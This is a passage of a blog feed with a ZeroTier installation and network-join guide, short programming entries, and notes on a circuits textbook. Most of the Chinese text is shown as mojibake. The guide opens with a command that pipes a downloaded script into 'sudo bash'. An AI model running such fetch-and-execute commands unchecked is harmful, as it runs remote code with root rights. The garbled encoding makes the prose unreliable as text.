curl -s https://install.zerotier.com | sudo bash<br></code></pre></td></tr></table></figure><p>å³å¯.</p><p>å…¶ä»–ç³»ç»Ÿè§ <a href="https://www.zerotier.com/download/">å®˜ç½‘</a></p><h1 id="åŠ å…¥ç½‘ç»œ"><a href="#åŠ å…¥ç½‘ç»œ" class="headerlink" title="åŠ å…¥ç½‘ç»œ"></a>åŠ å…¥ç½‘ç»œ</h1><p>éœ€è¦å…ˆè¿è¡Œ <code>zerotier-one</code> å‘½ä»¤æ¥å¼€å¯ç½‘ç»œæ¥å£. (å¯èƒ½å®‰è£…å®Œä¹‹åè‡ªåŠ¨å¼€å¯äº†)</p><p>åˆ©ç”¨ <code>zerotier-cli</code> å‘½ä»¤åŠ å…¥:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ zerotier-cli <span class="hljs-built_in">join</span> &lt;network <span class="hljs-built_in">id</span>&gt;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ç½‘ç»œå·å°±æ˜¯:</p><p><img src="/../img/zerotier_network_id.png"></p><p>åŠ å…¥ä¹‹ååˆ°:</p><p><img src="/../img/zerotier_member.png"></p><p><code>Members</code> ä¸€æ å‹¾é€‰å³å¯.</p><h1 id="Archlinux-ä¸‹å¯ç”¨"><a href="#Archlinux-ä¸‹å¯ç”¨" class="headerlink" title="Archlinux ä¸‹å¯ç”¨"></a>Archlinux ä¸‹å¯ç”¨</h1><p>å¯ä»¥ç›´æ¥ç”¨ pacman å®‰è£… <code>zerotier-one</code> :</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo pacman -S zerotier-one<br></code></pre></td></tr></table></figure><p>å¯ä»¥å…ˆç”¨ <code>ps</code> å‘½ä»¤æŸ¥çœ‹ <code>zerotier-one</code> æ˜¯å¦å¯ç”¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ps aux |grep zerotier-one<br></code></pre></td></tr></table></figure><p>æœªå¯ç”¨çš„è¯è¿è¡Œ:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ zerotier-one -U -d<br></code></pre></td></tr></table></figure><p>å¼€å¯å†…ç½‘æ¥å£.</p><p>ä½¿ç”¨ <code>zerotier-cli</code> å‘½ä»¤åŠ å…¥ç½‘ç»œ (å¯èƒ½è¦åŠ ä¸Š <code>sudo</code>):</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ zerotier-cli <span class="hljs-built_in">join</span> &lt;network <span class="hljs-built_in">id</span>&gt;<br></code></pre></td></tr></table></figure><p>æˆ‘çš„ä¸º <code>&lt;network id&gt;</code> ä¸º <code>93afae5963ed4d3a</code>, å› æ­¤å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ zerotier-cli <span class="hljs-built_in">join</span> 93afae5963ed4d3a<br></code></pre></td></tr></table></figure><p>ç”±äºæˆ‘çš„ä¸º Private, åŠ å…¥åè¿˜éœ€æœ¬äººæˆæƒ.</p><h2 id="å¼€æœºå¯åŠ¨"><a href="#å¼€æœºå¯åŠ¨" class="headerlink" title="å¼€æœºå¯åŠ¨"></a>å¼€æœºå¯åŠ¨</h2><p>å°†:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ zerotier-one -U -d<br></code></pre></td></tr></table></figure><p>åŠ å…¥åˆ° <code>~/.xinitrc</code> æ–‡ä»¶ä¸­å³å¯.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Perl-ä¸­-Tk-Animation-æ¨¡å—</title>
    <link href="/2023/02/01/Perl-%E4%B8%AD-Tk-Animation-%E6%A8%A1%E5%9D%97/"/>
    <url>/2023/02/01/Perl-%E4%B8%AD-Tk-Animation-%E6%A8%A1%E5%9D%97/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python-å®ç°åŠ¨æ€æ’åå›¾</title>
    <link href="/2023/02/01/Python-%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81%E6%8E%92%E5%90%8D%E5%9B%BE/"/>
    <url>/2023/02/01/Python-%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81%E6%8E%92%E5%90%8D%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<p>ä½¿ç”¨ <code>Pynimate</code> åº“.</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å°¼å°”æ£®ç”µè·¯-Notes</title>
    <link href="/2023/02/01/%E5%B0%BC%E5%B0%94%E6%A3%AE%E7%94%B5%E8%B7%AF-Notes/"/>
    <url>/2023/02/01/%E5%B0%BC%E5%B0%94%E6%A3%AE%E7%94%B5%E8%B7%AF-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬1ç« -ç”µè·¯å˜é‡"><a href="#ç¬¬1ç« -ç”µè·¯å˜é‡" class="headerlink" title="ç¬¬1ç«  ç”µè·¯å˜é‡"></a>ç¬¬1ç«  ç”µè·¯å˜é‡</h1><h3 id="1-1-1-ç”µè·¯ç†è®º"><a href="#1-1-1-ç”µè·¯ç†è®º" class="headerlink" title="1.1.1 ç”µè·¯ç†è®º"></a>1.1.1 ç”µè·¯ç†è®º</h3><p>æ³¢é•¿ $\lambda$ ç­‰äºä¿¡å·çš„é€Ÿåº¦é™¤ä»¥é¢‘ç‡, å³ $\lambda &#x3D; c &#x2F; f$.</p><p>è®°å¿†æ–¹æ³•, $\lambda$ çœ‹ä½œæ˜¯è·¯ç¨‹, c æ˜¯å…‰é€Ÿ, å³é€Ÿåº¦, f æ˜¯æ—¶é—´.</p><p>å¦‚æœä¿¡å·çš„æ³¢é•¿æ¯”ç³»ç»Ÿçš„ç‰©ç†å°ºå¯¸å¤§å¾—å¤š, åˆ™ç§°ç³»ç»Ÿä¸º <mark>é›†æ€»å‚æ•°ç³»ç»Ÿ</mark> (ç”µä¿¡å·èƒ½åŒæ—¶å½±å“ç³»ç»Ÿä¸­çš„æ‰€æœ‰ç‚¹).</p><h2 id="1-2-å›½é™…å•ä½åˆ¶"><a href="#1-2-å›½é™…å•ä½åˆ¶" class="headerlink" title="1.2 å›½é™…å•ä½åˆ¶"></a>1.2 å›½é™…å•ä½åˆ¶</h2><p><img src="/../img/SI_unit.png" alt="SI unit"></p><p>ä¸€èˆ¬ä½¿ç”¨çš„æŒ‡æ•°ä¸ºèƒ½è¢« 3 æ•´é™¤çš„å¹‚, å¦‚: $10^{-5}$ å¸¸å†™ä¸º $10^{-5} &#x3D; 10 \times 10^{-6}$.</p><h2 id="1-4-ç”µå‹ä¸ç”µæµ"><a href="#1-4-ç”µå‹ä¸ç”µæµ" class="headerlink" title="1.4 ç”µå‹ä¸ç”µæµ"></a>1.4 ç”µå‹ä¸ç”µæµ</h2><p>ç”µè·çš„ç‰¹æ€§:</p><ul><li>ç”µè·é‡æ˜¯ç¦»æ•£é‡, æ˜¯ç”µå­ç”µè·é‡ $1.6022 \times 10^{-19} C$ çš„æ•´æ•°å€.</li><li>ç”µç°è±¡å½’ç»“ä¸ºç”µè·çš„åˆ†ç¦»å’Œç”µè·çš„è¿åŠ¨</li></ul><p>åœ¨ç”µè·¯ç†è®ºä¸­, ç”µè·çš„åˆ†ç¦»å¼•èµ·ç”µèƒ½ (ç”µå‹), ç”µè·çš„è¿åŠ¨å¼•èµ·ç”µçš„æµåŠ¨ (ç”µæµ).</p><p>æ— è®ºæ˜¯æ­£ç”µè·è¿˜æ˜¯è´Ÿç”µè·è¢«åˆ†ç¦», éƒ½è¦æ¶ˆè€—èƒ½é‡. å¯ä»¥æƒ³, ä¸€æ­£ä¸€è´Ÿä¸¤ä¸ªç”µè·èµ·åˆå¾ˆæ¥è¿‘, è¦è®©æ­£ç”µè·è¿œç¦», éœ€è¦åšè´ŸåŠŸ, æ¶ˆè€—èƒ½é‡è½¬æ¢æˆåŠ¿èƒ½.</p><p><mark>ç”µå‹</mark> æ˜¯ç”±åˆ†ç¦»å¼•èµ·çš„å•ä½ç”µè·çš„èƒ½é‡ (å°†æ­£è´Ÿç”µè·åˆ†å¼€, è¦åšè´ŸåŠŸ, ä¹Ÿå°±æ˜¯æ¶ˆè€—èƒ½é‡, è¿™ä¸ªæ—¶å€™åŠ¿èƒ½ä¹Ÿå°±æ˜¯ç”µå‹å°±ä¼šäº§ç”Ÿ), è¡¨ç¤ºä¸ºå¾®åˆ†é‡çš„æ¯”:</p><p>$v &#x3D; \frac{\partial w}{\partial q}$</p><p>å•ä½ $V &#x3D; J&#x2F;C$</p><p>ç”µè·è¿åŠ¨å¼•èµ·çš„ç”µç°è±¡å–å†³äºç”µè·æµåŠ¨çš„é€Ÿç‡ï¼Œç”µè·æµåŠ¨çš„é€Ÿç‡ç»Ÿç§°ä¸ºç”µæµ:<br>$$<br>\displaylines{i &#x3D; \frac{dq}{dt}}<br>$$</p><p>å•ä½ $A &#x3D; C&#x2F;t$</p><p>å°½ç®¡ç”µæµæ˜¯ç”±ç¦»æ•£è¿åŠ¨çš„ç”µå­ç»„æˆï¼Œä½†æ˜¯æ²¡æœ‰å¿…è¦å•ç‹¬è€ƒè™‘ç”µå­çš„è¿åŠ¨ï¼Œå› ä¸ºç”µå­çš„æ•°é‡å¤ªå¤§äº†ï¼Œå¯ä»¥å°†è¿™äº›ç”µå­å’Œç›¸åº”çš„ç”µè·çœ‹æˆæ˜¯å¹³æ»‘çš„æµä½“ï¼Œå› æ­¤ï¼Œ $i$ è¢«è§†ä¸ºè¿ç»­é‡.</p><h2 id="1-5-ç†æƒ³åŸºæœ¬ç”µè·¯å…ƒä»¶"><a href="#1-5-ç†æƒ³åŸºæœ¬ç”µè·¯å…ƒä»¶" class="headerlink" title="1.5 ç†æƒ³åŸºæœ¬ç”µè·¯å…ƒä»¶"></a>1.5 ç†æƒ³åŸºæœ¬ç”µè·¯å…ƒä»¶</h2><p><mark>æ— æºç¬¦å·çº¦å®š</mark>:<br>ç”µæµæ–¹å‘å’Œå…ƒä»¶ç”µå‹é™çš„å‚è€ƒæ–¹å‘ä¸€è‡´ï¼Œå°±åœ¨ç”µå‹ä¸ç”µæµç›¸å…³çš„è¡¨è¾¾å¼ä¸­ä½¿ç”¨æ­£å· (+), å¦åˆ™ä½¿ç”¨è´Ÿå· (-).</p><p><mark>ç‚¹å‹é™çš„å‚è€ƒæ–¹å‘</mark> å³ä»å™¨ä»¶æ­£æåˆ°è´Ÿæ:</p><p><img src="/../img/refer_voltage_drop_dir.png"></p><p>åŠŸç‡ä¸ºæ­£ï¼Œç”µå­æŸå¤±èƒ½é‡ $p &#x3D; vi$</p><p>åŠŸç‡ä¸ºè´Ÿï¼Œç”µå­è·å¾—èƒ½é‡ $p &#x3D; -vi$</p><h2 id="ç¬¬ä¸€ç« ä¹ é¢˜"><a href="#ç¬¬ä¸€ç« ä¹ é¢˜" class="headerlink" title="ç¬¬ä¸€ç« ä¹ é¢˜"></a>ç¬¬ä¸€ç« ä¹ é¢˜</h2><h3 id="1-9"><a href="#1-9" class="headerlink" title="1.9"></a>1.9</h3><p>å…³äº:</p><p>$dq &#x3D; 20cos5000y dy$</p><p>è¿™ç§å¼å­çš„è§£æ³•.</p><p>ä¸¤è¾¹åŒæ—¶ç§¯åˆ†. è¿™é‡Œ substitute x for q on the left side and y for t on the right side:</p><p>$\int_{q(0)}^{q(t)}dx &#x3D; 20\int_0^tcos5000ydy$</p><p>ä¸ºä»€ä¹ˆæ˜¯ $q(t)$ å’Œ $q(0)$, å› ä¸ºå¯èƒ½æœ‰å¸¸æ•°.</p><h3 id="1-10"><a href="#1-10" class="headerlink" title="1.10"></a>1.10</h3><p>è¿™é‡Œçš„ä¸€ä¸ªå•ä½ä¸å¤ªæ¸…æ¥š:</p><p>$elec&#x2F;s$</p><p>è¿™ä¸ªå…¶å®ä¸ç”¨ç®¡, è¿™ä¸ªç›´æ¥ç†è§£å°±æ˜¯æ¯ç§’å¤šå°‘ä¸ªç”µå­.</p><h3 id="1-11"><a href="#1-11" class="headerlink" title="1.11"></a>1.11</h3><p>ä»€ä¹ˆæ˜¯é˜¿æ‰˜ç„¦è€³ $(aJ)$ å•ä½.</p><p>$aJ$ è¡¨ç¤º $10^{-18}J$ </p><h3 id="1-12"><a href="#1-12" class="headerlink" title="1.12"></a>1.12</h3><p>ç”µè·¯å…ƒä»¶çš„åŠŸç‡ä¸ºæ­£è¡¨ç¤º <mark>å¸æ”¶åŠŸç‡</mark>. (å¸æ”¶å°±ç†è§£ä¸º,<br>æ¶ˆè€—åˆ«äººæä¾›çš„èƒ½é‡)</p><p>ç”µè·¯å…ƒä»¶çš„åŠŸç‡ä¸ºè´Ÿè¡¨ç¤º <mark>é‡Šæ”¾åŠŸç‡</mark>. (é‡Šæ”¾å°±ç†è§£ä¸º, ç»™åˆ«äººèƒ½é‡)</p><p>ç”µå‹çš„æ­£è´Ÿè¡¨ç¤ºç”µå­é€šè¿‡è¿™ä¸ªç”µè·¯å…ƒä»¶çš„æ—¶å€™æ˜¯ <mark>å‹é™</mark>  è¿˜æ˜¯ <mark>å‹å‡</mark>.  (å‹é™å°±ç†è§£ä¸ºç”µå­éœ€è¦çš„èƒ½é‡, å‹å‡ç†è§£ä¸ºç”µå­è¦é‡Šæ”¾çš„èƒ½é‡)</p><p>æ¯”å¦‚, ç”µå‹ä¸º $60V$, æ„æ€å°±æ˜¯ç”µå­é€šè¿‡æ—¶ç”µå‹ä¸‹é™, å› æ­¤ç”µå­è·å¾—èƒ½é‡. (ç”µæºä¸º $60V$, æ„æ€æ˜¯ç”µå­ç»è¿‡æ—¶ä¼šæœ‰ 60eV çš„åŠ¿èƒ½è½¬åŒ–ä¸ºåŠ¨èƒ½, å°±æ˜¯éœ€è¦ 60eV çš„åŠ¿èƒ½)</p><h3 id="1-14"><a href="#1-14" class="headerlink" title="1.14"></a>1.14</h3><p>ç”µå‹çš„ææ€§å¯ä»¥ç”¨æ¥åˆ¤æ–­ç”µå‹ä¸‹é™çš„æ–¹å‘.</p><p>å‹é™å’Œç”µæµçš„æ–¹å‘ç»“åˆç”¨æ¥åˆ¤æ–­ä¸€ä¸ªç”µè·¯å…ƒä»¶æ˜¯å¸æ”¶åŠŸç‡è¿˜æ˜¯é‡Šæ”¾åŠŸç‡.</p><h3 id="1-15"><a href="#1-15" class="headerlink" title="1.15"></a>1.15</h3><p>ç”µæµçš„æ–¹å‘ä¼¼ä¹å’Œç”µå‹çš„æ­£è´Ÿå…³ç³»ä¸å¤§.</p><h3 id="1-18"><a href="#1-18" class="headerlink" title="1.18"></a>1.18</h3><p>è®¡ç®—ç”µè·¯å…ƒä»¶çš„ç«¯ç”µå‹å’Œç”µæµé‡Šæ”¾åˆ°å…ƒä»¶ä¸Šçš„æ€»èƒ½é‡, éœ€è¦è®¡ç®—æ— ç©·çš„ç§¯åˆ†, å¦‚:</p><p>$\int_0^{+\infty}$</p><h3 id="1-29"><a href="#1-29" class="headerlink" title="1.29"></a>1.29</h3><p>ç”¨ç”µæµå’Œç”µå‹è®¡ç®—åŠŸç‡ $p$ ä¹‹å‰è¦å…ˆåˆ¤æ–­æ˜¯ $p &#x3D; ui$ è¿˜æ˜¯ $p &#x3D; -ui$</p><p>é€šè¿‡ç”µæµæ–¹å‘å’Œå‹é™åˆ¤æ–­.</p><h3 id="1-30"><a href="#1-30" class="headerlink" title="1.30"></a>1.30</h3><p>åŠŸç‡æ£€æŸ¥, å°±æ˜¯è®¡ç®—é‡Šæ”¾åŠŸç‡å’Œå¸æ”¶åŠŸç‡, çœ‹å…¶å€¼æ˜¯å¦ç›¸ç­‰.</p><h1 id="ç¬¬2ç« -ç”µè·¯å…ƒä»¶"><a href="#ç¬¬2ç« -ç”µè·¯å…ƒä»¶" class="headerlink" title="ç¬¬2ç«  ç”µè·¯å…ƒä»¶"></a>ç¬¬2ç«  ç”µè·¯å…ƒä»¶</h1><p>äº”ä¸ªç†æƒ³çš„åŸºæœ¬ç”µè·¯å…ƒä»¶:</p><ul><li>ç”µå‹æº</li><li>ç”µæµæº</li><li>ç”µé˜»</li><li>ç”µæ„Ÿ</li><li>ç”µå®¹</li></ul><h2 id="2-1-ç”µå‹æºå’Œç”µæµæº"><a href="#2-1-ç”µå‹æºå’Œç”µæµæº" class="headerlink" title="2.1 ç”µå‹æºå’Œç”µæµæº"></a>2.1 ç”µå‹æºå’Œç”µæµæº</h2><p>ç”µæºï¼Œæ˜¯å°†éç”µèƒ½è½¬æ¢ä¸ºç”µèƒ½. (å¦‚ç”µæ± å°†åŒ–å­¦èƒ½è½¬æ¢ä¸ºç”µèƒ½).</p><p>ç”µæºä¸º 3V æ„å‘³ç€ï¼Œä¸€ä¸ªç”µå­åˆ°è¾¾ç”µæºæ—¶ï¼Œç”µæºæ¶ˆè€—èƒ½é‡å°†ç”µå­ä»ç”µæºæ­£æç§»åŠ¨åˆ°ç”µæºè´Ÿæ, è¿™ä¸ªè¿‡ç¨‹åƒç™»å±±ä¸€èˆ¬ (å³å‹å‡)ï¼Œç”µå­çš„ç”µåŠ¿èƒ½ä¼šå¢åŠ  åˆ° 3eVï¼Œè€Œåˆ°è¾¾è´Ÿæä¹‹åï¼Œç”µå­çš„ç”µåŠ¿èƒ½å°±ä¼šè½¬åŒ–ä¸ºåŠ¨èƒ½ï¼Œåƒä¸‹å±±ä¸€æ ·. </p><p>å°†ç”µèƒ½è½¬åŒ–ä¸ºæœºæ¢°èƒ½çš„ç§°ä¸ºç”µåŠ¨æœº.</p><p><mark>ç†æƒ³ç”µå‹æº</mark> æ˜¯ä¸€ç§ç”µè·¯å…ƒä»¶ï¼Œæ— è®ºæµè¿‡å…¶ä¸¤ç«¯ç”µæµçš„å¤§å°å¦‚ä½•. éƒ½å°†ä¿æŒç”µå‹ä¸ºç¨³å®šå€¼.</p><p><mark>ç†æƒ³ç”µæµæº</mark> æ˜¯ä¸€ç§ç”µè·¯å…ƒä»¶ï¼Œä¿æŒç”µæµä¸ºè§„å®šå€¼ï¼Œè€Œä¸è®ºç”µå‹çš„å¤§å°å¦‚ä½•ã€‚</p><p><mark>ç‹¬ç«‹æº</mark> , ç”µå‹æˆ–ç”µæµå€¼ç”±ç‹¬ç«‹æºçš„æ•°å€¼æŒ‡å®š.</p><p><mark>éç‹¬ç«‹æº</mark> , ç”µå‹æˆ–ç”µæµå€¼å–å†³äºç”µè·¯å…¶ä»–å¤„çš„ç”µå‹æˆ–ç”µæµ.</p><p>ç”¨åœ†åœˆç¬¦å·è¡¨ç¤ºç‹¬ç«‹æº:<br><img src="/../img/independent_source.png"></p><p>è±å½¢ç¬¦å·è¡¨ç¤ºéç‹¬ç«‹æº:<br><img src="/../img/dependent_source2.png"></p><p><mark>æœ‰æºå…ƒä»¶</mark> æŒ‡å¯ä»¥äº§ç”Ÿç”µèƒ½çš„å™¨ä»¶.</p><p><mark>æ— æºå…ƒä»¶</mark> æŒ‡ä¸èƒ½äº§ç”Ÿç”µèƒ½çš„å™¨ä»¶. å¦‚ç”µé˜»ï¼Œç”µæ„Ÿå’Œç”µå®¹.</p><h2 id="2-2-ç”µé˜»-æ¬§å§†å®šå¾‹"><a href="#2-2-ç”µé˜»-æ¬§å§†å®šå¾‹" class="headerlink" title="2.2 ç”µé˜» (æ¬§å§†å®šå¾‹)"></a>2.2 ç”µé˜» (æ¬§å§†å®šå¾‹)</h2><p>ç”µé˜»æ˜¯ç‰©è´¨é˜»ç¢ç”µæµ (æˆ–ç”µè·) æµåŠ¨çš„èƒ½åŠ›.</p><p>å¯ä»¥æƒ³è±¡ï¼Œæ„æˆç”µæµçš„ç”µå­åœ¨è¿åŠ¨è¿‡ç¨‹ä¸­ä¸ç‰©è´¨åŸå­ç»“æ„ç›¸äº’ä½œç”¨å¹¶å—åˆ°ä¸€å®šçš„é˜»åŠ›. åœ¨ç›¸äº’ä½œç”¨è¿‡ç¨‹ä¸­ï¼Œä¸€äº›ç”µèƒ½è¢«è½¬åŒ–ä¸ºçƒ­èƒ½å¹¶ä¸”ä»¥çƒ­çš„å½¢å¼æ¶ˆè€—æ‰.</p><p>å¤§å¤šæ•°ææ–™å¯¹ç”µæµçš„ç”µé˜»æ˜¯å¯æµ‹é‡çš„ã€‚ç”µé˜»çš„æ•°å€¼å¤§å°å–å†³äºæ‰€ç”¨çš„ææ–™.</p><p>ç”µé˜»çš„å¯¼æ•°ç§°ä¸ºç”µå¯¼. ç¬¦å·ç”¨å­—æ¯ $G$ è¡¨ç¤ºï¼Œå•ä½æ˜¯è¥¿é—¨å­ (S):<br>$$<br>\displaylines{G &#x3D; \frac{1}{R}S}<br>$$</p><h2 id="2-3-ç”µè·¯æ¨¡å‹ç»“æ„"><a href="#2-3-ç”µè·¯æ¨¡å‹ç»“æ„" class="headerlink" title="2.3 ç”µè·¯æ¨¡å‹ç»“æ„"></a>2.3 ç”µè·¯æ¨¡å‹ç»“æ„</h2><p>çŸ­è·¯ â€“&gt; $R &#x3D; 0$</p><p>å¼€è·¯ (æ–­è·¯) â€“&gt; $R &#x3D; \infty$ (ç©ºæ°”çš„ç”µé˜»å¾ˆå¤§)</p><h2 id="2-4-åŸºå°”éœå¤«å®šå¾‹"><a href="#2-4-åŸºå°”éœå¤«å®šå¾‹" class="headerlink" title="2.4 åŸºå°”éœå¤«å®šå¾‹"></a>2.4 åŸºå°”éœå¤«å®šå¾‹</h2><p><mark>ç«¯ç‚¹</mark> æ˜¯åˆ†ç«‹ç”µè·¯å…ƒä»¶çš„èµ·ç‚¹å’Œç»ˆç‚¹.</p><p><mark>èŠ‚ç‚¹</mark> æ˜¯ä¸¤ä¸ªæˆ–å¤šä¸ªå…ƒä»¶çš„è¿æ¥ç‚¹ ( <mark>æ³¨æ„</mark> ç”¨å¯¼çº¿è¿æ¥çš„ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œå³å‹é™ä¸ºé›¶çš„ä¸¤ä¸ªèŠ‚ç‚¹å¯è§†ä¸ºä¸€ä¸ªèŠ‚ç‚¹ )</p><h3 id="åŸºå°”éœå¤«ç”µæµå®šå¾‹"><a href="#åŸºå°”éœå¤«ç”µæµå®šå¾‹" class="headerlink" title="åŸºå°”éœå¤«ç”µæµå®šå¾‹"></a>åŸºå°”éœå¤«ç”µæµå®šå¾‹</h3><p>ç”µè·¯ä¸­ï¼Œä»»ä½•èŠ‚ç‚¹ä¸Šçš„æ‰€æœ‰ç”µæµçš„ä»£æ•°å’Œç­‰äºé›¶.</p><p>ä¸€èˆ¬æƒ…å†µä¸‹, èŠ‚ç‚¹ç”µæµçš„æ­£è´Ÿ:</p><ul><li>ç¦»å¼€èŠ‚ç‚¹çš„ç”µæµä¸ºæ­£å·ï¼Œè¿›å…¥èŠ‚ç‚¹çš„ä¸ºè´Ÿå·</li><li>ç¦»å¼€èŠ‚ç‚¹çš„ç”µæµä¸ºè´Ÿå·ï¼Œè¿›å…¥èŠ‚ç‚¹çš„ä¸ºæ­£å·<br>(å¯ä»¥è‡ªå·±è§„å®š)</li></ul><p>å¦‚, è¿™é‡Œä»¥è¿›å…¥ä¸ºæ­£:<br><img src="/../img/Kirchhoff's_current_law.jpg"></p><p>$$<br>\displaylines{I_1 - I_2 - I_3 &#x3D; 0}<br>$$</p><p>å«æœ‰ n ä¸ªèŠ‚ç‚¹çš„ç”µè·¯ä¸­ï¼Œåˆ©ç”¨åŸºå°”éœå¤«ç”µæµå®šå¾‹å¯ä»¥å¾—åˆ° $n - 1$ ä¸ªç‹¬ç«‹çš„ç”µæµæ–¹ç¨‹å¼.</p><p>(ä¸ºä»€ä¹ˆæ˜¯ <code>n-1</code> ä¸ª, åŸæœ¬å¯ä»¥åˆ—å‡º <code>n</code> ä¸ªæ–¹ç¨‹, ä½†ç¬¬ <code>n</code> ä¸ªæ–¹ç¨‹å¯ä»¥ç”¨å…¶ä»– <code>n-1</code> ä¸ªæ¨å¯¼å‡º)</p><p>ä¾‹å­:</p><p><img src="/../img/example_of_Kirhoff_current_equation.png"></p><p>è¿™é‡Œæœ‰ä¸‰ä¸ªèŠ‚ç‚¹, å› æ­¤å¯ä»¥åˆ—å‡ºä¸‰ä¸ªæ–¹ç¨‹:<br>$$<br>\displaylines{<br>\begin{cases}<br>I_1 - I_2 &#x3D; 0 \newline~ \newline<br>I_2 - I_3 &#x3D; 0 \newline~ \newline<br>I_3 - I_1 &#x3D; 0<br>\end{cases}<br>}<br>$$<br>å¯ä»¥ä»å‰ä¸¤ä¸ªå¼å­æ¨å‡ºç¬¬ä¸‰ä¸ª, å› æ­¤åªéœ€è¦ä¸¤ä¸ªæ–¹ç¨‹:<br>$$<br>\displaylines{<br>\begin{cases}<br>I_1 - I_2 &#x3D; 0 \newline~ \newline<br>I_2 - I_3 &#x3D; 0<br>\end{cases}<br>}<br>$$<br>å³ <code>n-1</code> ä¸ªæ–¹ç¨‹å¼.</p><h3 id="åŸºå°”éœå¤«ç”µå‹å®šå¾‹"><a href="#åŸºå°”éœå¤«ç”µå‹å®šå¾‹" class="headerlink" title="åŸºå°”éœå¤«ç”µå‹å®šå¾‹"></a>åŸºå°”éœå¤«ç”µå‹å®šå¾‹</h3><p>åœ¨ç”µè·¯ä¸­ï¼Œç¯ç»•ä»»ä½•é—­åˆè·¯å¾„çš„çš„æ‰€æœ‰ç”µå‹çš„ä»£æ•°å’Œç­‰äºé›¶.</p><p><mark>é—­åˆè·¯å¾„</mark> ä»»é€‰ä¸€ä¸ªèŠ‚ç‚¹ä½œä¸ºèµ·ç‚¹ï¼Œè‹¥æ²¿ç€ç”µè·¯ä¸­çš„é—­åˆè·¯å¾„ï¼Œåˆ™é€šè¿‡æ‰€é€‰çš„åŸºæœ¬ç”µè·¯å…ƒä»¶å›åˆ°åŸå§‹èŠ‚ç‚¹ï¼ŒæœŸé—´é€šè¿‡ä»»ä½•ä¸­é—´èŠ‚ç‚¹éƒ½ä¸è¶…è¿‡ä¸€æ¬¡.</p><p>ç”µå‹é™ç”¨æ­£å·.</p><h2 id="2-5-å«å—æ§æºç”µè·¯çš„åˆ†æ"><a href="#2-5-å«å—æ§æºç”µè·¯çš„åˆ†æ" class="headerlink" title="2.5 å«å—æ§æºç”µè·¯çš„åˆ†æ"></a>2.5 å«å—æ§æºç”µè·¯çš„åˆ†æ</h2><p>ä¸æ˜¯ä»»ä½•é—­åˆè·¯å¾„éƒ½èƒ½æ ¹æ®åŸºå°”éœå¤«ç”µå‹å®šå¾‹æä¾›æœ‰ç”¨çš„æ–¹ç¨‹.</p><p>ä¸æ˜¯ä»»ä½•èŠ‚ç‚¹éƒ½èƒ½æ ¹æ®åŸºå°”éœå¤«ç”µæµå®šå¾‹æä¾›æœ‰ç”¨çš„æ–¹ç¨‹.</p><h1 id="ç¬¬3ç« -ç®€å•ç”µé˜»ç”µè·¯"><a href="#ç¬¬3ç« -ç®€å•ç”µé˜»ç”µè·¯" class="headerlink" title="ç¬¬3ç«  ç®€å•ç”µé˜»ç”µè·¯"></a>ç¬¬3ç«  ç®€å•ç”µé˜»ç”µè·¯</h1><p>å†å²ä¸Šï¼Œç›´æµç”µæµå®šä¹‰ä¸ºç”±æ’å®šç”µå‹äº§ç”Ÿçš„ç”µæµ. å› æ­¤ï¼Œæ’å®šç”µå‹è¢«ç§°ä½œç›´æµ (æˆ– dc) ç”µå‹.</p><h2 id="3-3-åˆ†å‹å™¨å’Œåˆ†æµå™¨ç”µè·¯"><a href="#3-3-åˆ†å‹å™¨å’Œåˆ†æµå™¨ç”µè·¯" class="headerlink" title="3.3 åˆ†å‹å™¨å’Œåˆ†æµå™¨ç”µè·¯"></a>3.3 åˆ†å‹å™¨å’Œåˆ†æµå™¨ç”µè·¯</h2><p>åˆ†å‹å™¨å…¶å®å°±æ˜¯åˆ©ç”¨ç”µé˜»ä¸²è”åˆ†å‹.</p><p>åˆ†æµå™¨å…¶å®å°±æ˜¯åˆ©ç”¨ç”µé˜»å¹¶è”åˆ†æµ.</p><h2 id="3-4-åˆ†å‹æ³•å’Œåˆ†æµæ³•"><a href="#3-4-åˆ†å‹æ³•å’Œåˆ†æµæ³•" class="headerlink" title="3.4 åˆ†å‹æ³•å’Œåˆ†æµæ³•"></a>3.4 åˆ†å‹æ³•å’Œåˆ†æµæ³•</h2><p>åˆ†å‹æ³•å…¬å¼:<br>$$<br>\displaylines{V_j &#x3D; iR_j \newline~ \newline<br>i &#x3D; \frac{v}{R_{eq}}   \newline~ \newline<br>V_j &#x3D; \frac{R_j}{R_{eq}}v}<br>$$<br>ä¹Ÿå°±æ˜¯ç”µé˜»å æ€»ç”µé˜»çš„å¤šå°‘.<br>(è¿™é‡Œçš„ $v$ æŒ‡æ€»ç”µå‹, $R_{eq}$ æŒ‡ç­‰æ•ˆç”µé˜», ä¹Ÿå°±æ˜¯æ€»ç”µé˜»)</p><p>åˆ†æµæ³•å…¬å¼:<br>$$<br>\displaylines{i_j &#x3D; \frac{v}{R_j} \newline~ \newline<br>v &#x3D; iR_{eq} \newline~ \newline<br>i_j &#x3D; \frac{R_{eq}}{R_j}i}<br>$$<br>ç”µå‹æ˜¯æ€»ç”µæµä¹˜ä»¥ç­‰æ•ˆç”µé˜».<br>(è¿™é‡Œçš„ 